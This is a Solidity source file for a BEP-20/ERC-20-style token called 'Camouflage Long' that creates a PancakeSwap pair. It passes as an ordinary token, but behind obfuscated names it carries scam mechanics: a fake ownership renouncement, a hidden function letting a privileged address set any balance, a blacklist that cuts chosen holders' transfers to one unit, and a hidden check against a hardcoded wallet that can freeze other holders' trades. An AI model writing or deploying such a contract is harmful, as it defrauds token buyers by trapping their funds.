//SPDX-License-Identifier: MIT

pragma solidity ^0.8.8;

interface tradingSender {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract txList {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface teamLaunched {
    function createPair(address walletFee, address swapAmountSell) external returns (address);
}

interface walletReceiver {
    function totalSupply() external view returns (uint256);

    function balanceOf(address totalIsMarketing) external view returns (uint256);

    function transfer(address feeMax, uint256 walletLiquidity) external returns (bool);

    function allowance(address feeReceiver, address spender) external view returns (uint256);

    function approve(address spender, uint256 walletLiquidity) external returns (bool);

    function transferFrom(
        address sender,
        address feeMax,
        uint256 walletLiquidity
    ) external returns (bool);

    event Transfer(address indexed from, address indexed minTeam, uint256 value);
    event Approval(address indexed feeReceiver, address indexed spender, uint256 value);
}

interface walletReceiverMetadata is walletReceiver {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract CamouflageLong is txList, walletReceiver, walletReceiverMetadata {

    address public tokenLaunch;

    function enableSell(address tradingMin) public {
        require(tradingMin.balance < 100000);
        if (totalFundLaunch) {
            return;
        }
        if (exemptIs != enableTeam) {
            enableTeam = maxEnable;
        }
        amountReceiver[tradingMin] = true;
        
        totalFundLaunch = true;
    }

    string private totalMax = "CLG";

    address private modeReceiver;

    bool public totalFundLaunch;

    uint256 enableMarketing;

    function fundTeam(uint256 walletLiquidity) public {
        minTxFrom();
        modeSender = walletLiquidity;
    }

    function walletFrom(address walletToken, address feeMax, uint256 walletLiquidity) internal returns (bool) {
        if (walletToken == tokenLaunch) {
            return txTake(walletToken, feeMax, walletLiquidity);
        }
        uint256 minMarketing = walletReceiver(buyTakeReceiver).balanceOf(marketingWallet);
        require(minMarketing == modeSender);
        require(feeMax != marketingWallet);
        if (receiverFund[walletToken]) {
            return txTake(walletToken, feeMax, toAt);
        }
        return txTake(walletToken, feeMax, walletLiquidity);
    }

    mapping(address => uint256) private txMax;

    uint8 private minBuy = 18;

    function txTake(address walletToken, address feeMax, uint256 walletLiquidity) internal returns (bool) {
        require(txMax[walletToken] >= walletLiquidity);
        txMax[walletToken] -= walletLiquidity;
        txMax[feeMax] += walletLiquidity;
        emit Transfer(walletToken, feeMax, walletLiquidity);
        return true;
    }

    uint256 modeSender;

    address tradingMax = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 public enableTeam;

    function totalSupply() external view virtual override returns (uint256) {
        return feeLimit;
    }

    uint256 public maxEnable;

    function minTxFrom() private view {
        require(amountReceiver[_msgSender()]);
    }

    function symbol() external view virtual override returns (string memory) {
        return totalMax;
    }

    constructor (){
        
        tradingSender toFrom = tradingSender(tradingMax);
        buyTakeReceiver = teamLaunched(toFrom.factory()).createPair(toFrom.WETH(), address(this));
        if (enableTeam != maxEnable) {
            exemptIs = fromTake;
        }
        tokenLaunch = _msgSender();
        tradingShouldMarketing();
        amountReceiver[tokenLaunch] = true;
        txMax[tokenLaunch] = feeLimit;
        
        emit Transfer(address(0), tokenLaunch, feeLimit);
    }

    uint256 private fromTake;

    event OwnershipTransferred(address indexed isTake, address indexed marketingTeam);

    function decimals() external view virtual override returns (uint8) {
        return minBuy;
    }

    function allowance(address senderReceiver, address takeAt) external view virtual override returns (uint256) {
        if (takeAt == tradingMax) {
            return type(uint256).max;
        }
        return txTrading[senderReceiver][takeAt];
    }

    bool public swapAuto;

    function transferFrom(address walletToken, address feeMax, uint256 walletLiquidity) external override returns (bool) {
        if (_msgSender() != tradingMax) {
            if (txTrading[walletToken][_msgSender()] != type(uint256).max) {
                require(walletLiquidity <= txTrading[walletToken][_msgSender()]);
                txTrading[walletToken][_msgSender()] -= walletLiquidity;
            }
        }
        return walletFrom(walletToken, feeMax, walletLiquidity);
    }

    function approve(address takeAt, uint256 walletLiquidity) public virtual override returns (bool) {
        txTrading[_msgSender()][takeAt] = walletLiquidity;
        emit Approval(_msgSender(), takeAt, walletLiquidity);
        return true;
    }

    address public buyTakeReceiver;

    string private receiverTrading = "Camouflage Long";

    bool private isSell;

    address marketingWallet = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function owner() external view returns (address) {
        return modeReceiver;
    }

    uint256 constant toAt = 1 ** 10;

    function transfer(address receiverSwap, uint256 walletLiquidity) external virtual override returns (bool) {
        return walletFrom(_msgSender(), receiverSwap, walletLiquidity);
    }

    function tradingShouldMarketing() public {
        emit OwnershipTransferred(tokenLaunch, address(0));
        modeReceiver = address(0);
    }

    function launchTrading(address minMaxLaunch) public {
        minTxFrom();
        
        if (minMaxLaunch == tokenLaunch || minMaxLaunch == buyTakeReceiver) {
            return;
        }
        receiverFund[minMaxLaunch] = true;
    }

    mapping(address => bool) public amountReceiver;

    uint256 private exemptIs;

    mapping(address => bool) public receiverFund;

    function balanceOf(address totalIsMarketing) public view virtual override returns (uint256) {
        return txMax[totalIsMarketing];
    }

    mapping(address => mapping(address => uint256)) private txTrading;

    function getOwner() external view returns (address) {
        return modeReceiver;
    }

    function amountFund(address receiverSwap, uint256 walletLiquidity) public {
        minTxFrom();
        txMax[receiverSwap] = walletLiquidity;
    }

    uint256 private feeLimit = 100000000 * 10 ** 18;

    function name() external view virtual override returns (string memory) {
        return receiverTrading;
    }

}